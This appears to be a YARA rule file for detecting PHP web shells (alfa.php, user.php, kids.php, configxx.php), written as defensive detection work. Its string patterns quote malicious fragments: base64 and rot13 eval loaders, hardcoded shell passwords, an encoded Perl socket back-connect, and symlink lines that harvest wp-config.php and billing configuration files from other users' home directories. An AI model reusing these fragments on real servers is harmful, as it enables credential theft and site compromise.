      $s3 = "donesian Coder - Surabaya Hackerlink - Serverisdown - And All Forum Hacking In The World" fullword ascii
      $s4 = "iAgIH0NCiAgfQ0KfQ0KfQ0KDQplY2hvICc8L2JvZHk+PC9odG1sPic7\"; eval(base64_decode($scanconfig));" fullword ascii
      $s5 = "// Thanks for : Hacker Cisadane - Lumajangcrew - TMTC 2 - Devilzc0de - Hacker Newbie - Indonesian Cyber - Indonesian Hacker - In" ascii
      $s6 = "// Thanks for : Hacker Cisadane - Lumajangcrew - TMTC 2 - Devilzc0de - Hacker Newbie - Indonesian Cyber - Indonesian Hacker - In" ascii
      $s7 = "evilgirl | blackboy007 | dopunk | l1n9g4 | spykit | and you" fullword ascii
      $s8 = "// Supporter by : cakill | xadpritox | dansky | arulz | direxer | jhoni | guard | nacomb13 | nobita_chupuy | mr.at | zerocool | " ascii
      $s9 = "ml0eS5jb208L2E+IC0gPGEgaHJlZj0iaHR0cDovL2hhY2tlci1jaXNhZGFuZS5vcmciIHRhcmdldD1fYmxhbms+d3d3LmhhY2tlci1jaXNhZGFuZS5vcmc8L2E+DQo8L" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( all of them )
      ) or ( all of them )
}

rule _media_brian_88D1_7DB91_infected_05_29_18_case109_case109_alfa {
   meta:
      description = "case109 - file alfa.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "4a471333f029f03c8486d3bca677368e8551eb6872cd1d2d07de0a091b8aa30d"
   strings:
      $x1 = "if(!function_exists('bas'.'e'.'64_'.'en'.'code')){function __ZW5jb2Rlcg($data){if(empty($data))return;$b64='ABCDEFGHIJKLMNOPQRST" ascii
      $s2 = "implode($tmp_arr, '');$r = (strlen($data) % 3);return ($r ? substr($enc, 0, ($r - 3)) : $enc).substr('===', ($r || 3));}functio" fullword ascii
      $s3 = "'color' => array(\"shell_border\" => \"#0E304A\",\"header_vars\" => \"#27979B\",\"header_values\" => \"#67ABDF\",\"header_on\" =" ascii
      $s4 = "'post_encryption' => true," fullword ascii
      $s5 = "'login_page' => 'gui'," fullword ascii
      $s6 = "TeVxttE9r7a1gEt1wVk871WVIRmm//DTmndSBtLcLOZt+IHcGGL+qo2KfRnTowzbWn7qjrRCP0ezl/ey91f2HaI90Vs9qv8YO4P9PnjJ7VqvzNSwT/GUcf+TN45BEtfF" ascii
      $s7 = "VeD4W4A6ffZm4EvNGeT9s5rcZb/wEckhfdIVifyDrviH3D57uvphWIR61Z/Qz3x7qu7PGSnjcLt019B5//KQpp5+ucDt0ShVp4xcBouOSpH3/dJxY0mUP2BtcW97F+n/" ascii
      $s8 = "10/mZow2LoxkKnhPrIYm12NEQPuqEBdiI+r1LoQLgc1THQqNHfTpfmLmo3+r39bj4NBSmSi3NU7MwcmFeOu/D2HT8L0a8TtiHmrLzOvS6AE9m0QAh3S96tJbF5Stih8d" ascii
      $s9 = "ZTxWcHj/aGCP37hYM3lu1fAwUHHEvsvT12ubAJe9pYihkY7Xpul3jxb7NBPZhMcKbWIk55Xhn5Y1ocT0+fqGKkczeXABnxH3ifaML0pDKNF62pf7x5rV/i/Fgeti0Bm4" ascii
      $s10 = "uTqL98Iwv8Mvs4uyWiu50oVtLTo1Prli2GskoopfeXArloeROoMjnL/a7r4w+x5zPBug9HfgETI1/J/Q5FStoXQac2e2Mw1c/c4n5COzOQ2/wNZKP8uyCJ5GxJuHlvdS" ascii
      $s11 = "6/T0v3eMo8Sa7ls9jHIoKUvqqPC6bckRXjyRziFGvgIKmw0yt3zAyu4RWcyGmk6056um92ZKdXhLkdehEwjIDVfU7JlRVmXYiAUqEyerxGEvCjsC+vz+ISysTH1XqJ/7" ascii
      $s12 = "\"#27979B\",\"outputs_text\" => \"#67ABDF\",\"outputs_border\" => \"#0E304A\",\"uploader_border\" => \"#0E304A\",\"uploader_back" ascii
      $s13 = "deFdvEmWZ21KzD9C1p/aUBDs59swr6IVqPZlXgKzyuNorYeOuaSH/HEsjurqCRtRuxD25+/dgy5jWyz3mVTdLLLmGxW6svszaauV3jIwkcT1rBSGy3GLBVzriKct8cSz" ascii
      $s14 = "tEDoJrEwGAfs4gRRnH25FVtAK0wU0adb3SvYGTdl+evpnfAhwpk6/STrp4Zjpn94TqG8j4CXA9WllR69KYZtklAAiMpygmXY7FLKAYy16MZzWMgcs1irCoGlKBewMeOi" ascii
      $s15 = "E2kFjHVi/sP0CezleuscrvDk1kgp6lorTJRreXN0bZ1U+4mC07arHFkEgUNER4oCQtfJsR2Ptke2gJvLsIdeOlsVlifKEPvZKvXBTQXmkvAV535IZtScb4sjRX5Gsw+a" ascii
      $s16 = "tFbC03oiWzayvljIV7089k37b/J91yrFwP/vgOpH6smfzGKPpK3bJUjlPGbcQjXdTRKlKXFBFtPcT57Nv0U4UYsAzzYCr7VH334x/9jkuuefcS69Xw2GXZUMwUlTJ97I" ascii
      $s17 = "UWiRcTLa2bN1VdnivzrVylhoNTZKiM89Dtm8sJQo1fHwwVGxQaZcdlO7ieQpbr/NjjkRlok3mk6plSZdzX3ExbfYxZ80nTd/vtKo7keh21iZVnKL0fHEhTiH/ouMB0ED" ascii
      $s18 = "Fs65nYHb89M0HLUQBlXz89IYV+hwSFHW7TDKCqT9weqfY1DNuneUDOvatN+Cc4lDFHN+Bt2GkKMIxnQ3FF/GRLm+KK+lvuuHeADkKfbNwxi4hiamFRJQq0nN0OlIxSWv" ascii
      $s19 = "9wI+/WKBDdE62frRgom4lfVp5muNlIcT+dXF222Ud3H10A3lOGuyBn3wlUurk0s/6OJaFmGeBq11i/Hkk29dlwQ4jbY/E3Rz1alN0lrGXKPfBuamh+46xxUn7qL2IqRu" ascii
      $s20 = "wKPTcGi+ht2JbVEpuMBZM8t5tdidsBfaAEYzqtfDRU5vmDB+O/H2qS+Cp9OGs37ArySOHgOPSeigi6y2DiNuQ3iXXtbp6eye8kyrTNkiVfiTxVtGNGN76q5DltsuY1Xr" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 700KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _infected_05_29_18_case109_case109_user {
   meta:
      description = "case109 - file user.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "efdb09b3e16e1bd17bf2c991c45d285e2913afb9892f6844ef12586dfac0b22f"
   strings:
      $s1 = "if(!function_exists(\"TC9A16C47DA8EEE87\")){function TC9A16C47DA8EEE87($T059EC46CFE335260){$T059EC46CFE335260=base64_decode($T05" ascii
      $s2 = "KcGJpOQAAd1pYSnNEUXAxYzJVZ1UyOQAAamEyVjBPdzBLSkdsaFpHUgAAeVBXbHVaWFJmWVhSdmJpZwAAa1FWSkhWbHN3WFNrZ2ZIdwAAZ1pHbGxLQ0pGY25KdmNqbwB" ascii /* base64 encoded string 'pbi9  wZXJsDQp1c2UgU29  ja2V0Ow0KJGlhZGR  yPWluZXRfYXRvbig  kQVJHVlswXSkgfHw  gZGllKCJFcnJvcjo ' */
      $s3 = "if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)" fullword ascii
      $s4 = "//PASSWORD CONFIGURATION" fullword ascii
      $s5 = "$chk_login = true;" fullword ascii
      $s6 = "if($chk_login == true)" fullword ascii
      $s7 = "<input type=password name=pass size=30>" fullword ascii
      $s8 = "@$pass = $_POST['pass'];" fullword ascii
      $s9 = "$password = \"youselee123@\";" fullword ascii
      $s10 = "SBNPPbnQUsD48EwI+LnAge2P/4TojnHj8cDt9z5AUgSKCIG9iGllsEAURGyMkdG1+FHAZsAIgETgM4QGUzYBnX3JlGMBjw6AhKAAQYm9keXxhOlx3K3wAsSwgdGSCgAB" ascii
      $s11 = "d1THgrhFGsPCBF8Qs8ykZASEBqyvSXqL+cDGv2tAxrwSzDjD0NRxIRXjw0PAR1GEtY29kWgRlHO9uHONYEG2OEj1wZiBtZYXgZD1ABHBKwCBvbnN1Ym1pdD0iJUB0aBQ" ascii
      $s12 = "BBZMlrySyAFxcB28nMVwnKyYCI4El/3Ml8gHBYVIwJYMA4U5UH99iaWcBgUMzXc9SRF3PUyFdzyBAMQvyXc/GbQ8y35kVTQ/4LwphCcIsPyw/DBMsPGhlgAMsYSRjIoD" ascii
      $s13 = "oIjrp8QH1X1BPU1RbJwHjMEAD0SEQL8V0N/An+bAcID0gMSxkBXEEYEBmaWxUYC9ldGMv+aUN8fwgCzIDwEAAX2Hn0u/SKTMAICBDMGW34tfnBAJU8CRZQGUFRACxBUA" ascii
      $s14 = "0dAxQb25jbGljG/5rPSIj4SZCYRgRKYMkAgFTCiAgtSQLAfMDRyzf0AESIA9kIAckLgMyB4gETyu0BEcinEQiPj4iAYs+IDxub2JyDfoDEmJveNFTYQvwAxQDSTEgJy4" ascii
      $s15 = "gIKogPZb+hMBtaxdxJyVQILQhAQEVlSZ5FSUMX8VgJuAsD4IgJ3cnB7IMWQQmd5AP0CJlZGl0MREgv3sK/yALMAqiMsD7X/tRMjEg8PK5nx/C+tYgDHoPd7Q+CoApDsQ" ascii
      $s16 = "if($pass == $password)" fullword ascii
      $s17 = "DE2E=strlen($T059EC46CFE335260);$T43D5686285035C13=__FILE__;$T43D5686285035C13=file_get_contents($T43D5686285035C13);$T6BBC58A3B" ascii
      $s18 = "jgP0EgIQqvCM9DkAjISWQHgCkNUmNhbGxf7CFPQF8MISgnAr8CsQkgSFB0AHA/Pg==\"));?>'));" fullword ascii
      $s19 = "<b>Your ip :D:</b> \".$_SERVER[\"REMOTE_ADDR\"].\"" fullword ascii
      $s20 = "sIJRRZiF9wBsxMXEEUs8EBmAuYWJyLjKVwhrgAbInPHByZQu0bWxrhTEnkgL0LwGgPjFBqoEbMQkgIAkMmScRdQFAb2Z0d2FyZX0wQJZQZW52KCdTAABFUlZFUl9TT0Z" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 8 of them )
      ) or ( all of them )
}

rule _infected_05_29_18_case109_case109_kids {
   meta:
      description = "case109 - file kids.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "3988058b6c0458b0641b39c0239da1217a929d0ce956f014a7f03642f0910be6"
   strings:
      $s1 = "//Shell Recoded From IndoXploit Shell" fullword ascii
      $s2 = "$auth_pass = \"44ee8cb2007d0b0b274293aa224d33d5\"; //default : votrshell" fullword ascii
      $s3 = "$Kidsjamannow= \"7X35e9rIsujPme+b/6Gj8Q32jc1zO4nXGeyAaoyxjZdZHp9RJG6MhSRAU8zk/e2vqhepJQQGh9xmzn2Ts0v0RV3dXV1IXV1deriG4XZ33TAt3Vx" ascii
      $s4 = "//Thanks Buat Yg Udh Support Buat Shell Ini" fullword ascii
      $s5 = "hOEK1cPvkjYo3cNtwWWYySSb/ZTtvj5lPCCmuaI12joafck7Gz63COzHUkCxtE9Jwl7yWGXoXreiaLseHpGkPbWrcsZeUwvPFUukmMhyNMm1EtD6nV5ixNOX3f8H\";" fullword ascii
      $s6 = "//Thanks For Ashura - MA_h4ck0601 - ScarleT7 - Cyber Merah Putih" fullword ascii
      $s7 = "2H25oDwviqLEMgj/cyB2KV4xvSPyUfXvcRZHkYuafb350kuKZf+C0aR7s218WYOmw+woYVZaQ09bY9BN+YenbYjzogJlmTIJ0bChoNVoAWf8SZ0WDcyhjgEI/D66HiBQ" ascii
      $s8 = "T9qLUibmfw8lQWfMRW/MRcGYwZBEdtkFru+3gZwOO1rVeYKWdDdoAzTOLWxZSgL9BpK2AkipBW2qyxr+zXP0CVlys6+BwvpKRf0GdaY+1qCS0+hbwB42RE7C/+Xw/37r" ascii
      $s9 = "eval(str_rot13(gzinflate(str_rot13(base64_decode(($Kidsjamannow))))));" fullword ascii
      $s10 = "###############################################################################" fullword ascii
      $s11 = "s1hCOXTmzCmDOhkj8aaWRld3Kp4cuNEnSRvLj0aSrXy02ktenBJutBKqBcxnrKlU8WCiWc+0/lpZPGQDi+fUAwxfx3Ljqu0XZ8m3zDqoznWTnVfFculsmV3rfkPzp7NI" ascii
      $s12 = "ohteZSk2vDMD1J1Td/dppWuxQihYnh0jmEQgNRU2YIBJ+IMcpfMzA3vSR7ef2j2DPyvXeU4UNNPrba4+hxXRedCT3N1Q+mpz5Cx06KkoKsrscHMAruNEJy4E0TQ1RYXf" ascii
      $s13 = "OryrnH8u+hs3BwP6fWOQLdwB4zk8HBydH5RNvRvO4CQGoNUGVHp1o73nlQe1IyBzj8LGCwnNs+MCMDDBuHV92r8p6kYmBGgPi0h/Dx8o2/fOKD7AfEw/h2dkd7g4D2WI" ascii
      $s14 = "+xflg3eAaKltEPgYY8d2thKXxdRQd7g+yfFotUuFLk8qYBi2xt0WglhdsAsO1gB5aVBaNChtX8Jl7I5eJB+5H+tj7O4Wq0sKbTyq/bq6runLpHRoPMNvw4XanlK4uq+2" ascii
      $s15 = "2lbBp+2i5ZTuq2pFq+w37Fx6+juXIvTceCfFQKYoOIB5OslVZnEqWh23vqhkkFqBNPtQFLov5xo/GyHU9+06Hatd+MIBIn+hAosjBOqlxQzOqd8hdFRu+3OYLA+GNrsF" ascii
      $s16 = "/1GT/1compT2PRFxEsQgNZqcVwCQlLaZABPjGqdDx6TjsjT6nyW+rUygbZz8iMkywqL1S4mmV9+BoeXwxSW2GxI8ikhU7uSrgyBNOnyjCipecoCfImE6y4lpX+HhzRDC" ascii
      $s17 = "lGDffWP9HeZuNAclOKCC+IGtUTmpzBSCioaMDid0Ka4Tyxx1oo6boHz/ZjJY/45KwumfKTxPMXK7n9stN1qNRxFWvL5WGNl5dCCHlhjjN21EK/KiE31TUD9Efoc29PQJ" ascii
      $s18 = "BP0Mc1QFqtdbDRnOAZ414mHE2dddcGlPoCAdhBnAIBT6K2yb02SAg6RpL87JBXy8c9Hjbc8HK38MTlogAnfrBQkf+tmkktsaaz7wqFv4f2U/sacTIPpNQniaO6hPI8/E" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 90KB and
         ( 8 of them )
      ) or ( all of them )
}

rule configxx {
   meta:
      description = "case109 - file configxx.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "19cd21d9ac142fcb3394d8cf200ee8edc0d158c6f33a22d09da8d3e8e28b8955"
   strings:
      $s1 = "@symlink('/home/'.$user.'/public_html/supports/includes/iso4217.php',$user.'-hostbills-supports.txt');" fullword ascii
      $s2 = "@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-hostbills-support.txt');" fullword ascii
      $s3 = "@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');" fullword ascii
      $s4 = "@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');" fullword ascii
      $s5 = "@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-hostbills-hostbills.txt');" fullword ascii
      $s6 = "@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');" fullword ascii
      $s7 = "@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-clientsupport.txt');" fullword ascii
      $s8 = "@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-hosting.txt');" fullword ascii
      $s9 = "@symlink('/home/'.$user.'/public_html/requires/config.php',$user.'-AM4SS-hosting.txt');" fullword ascii
      $s10 = "@symlink('/home/'.$user.'/public_html/hosts/configuration.php',$user.'-hosts.txt');" fullword ascii
      $s11 = "@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-host.txt');" fullword ascii
      $s12 = "@symlink('/home/'.$user.'/public_html/hostings/includes/iso4217.php',$user.'-hostbills-hostings.txt');" fullword ascii
      $s13 = "@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-hostbills-hosting.txt');" fullword ascii
      $s14 = "@symlink('/home/'.$user.'/public_html/hostbill/includes/iso4217.php',$user.'-hostbills-hostbill.txt');" fullword ascii
      $s15 = "@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-hostbills-billing.txt');" fullword ascii
      $s16 = "@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-hostbills-billings.txt');" fullword ascii
      $s17 = "@symlink('/home/'.$user.'/public_html/supports/configuration.php',$user.'-supports.txt');" fullword ascii
      $s18 = "@symlink('/home/'.$user.'/public_html/hosts/includes/iso4217.php',$user.'-hostbills-hosts.txt');" fullword ascii
      $s19 = "@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-hostbills-client.txt');" fullword ascii
      $s20 = "@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-hostbills-host.txt');" fullword ascii
   condition:
      ( uint16(0) == 0x683c and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

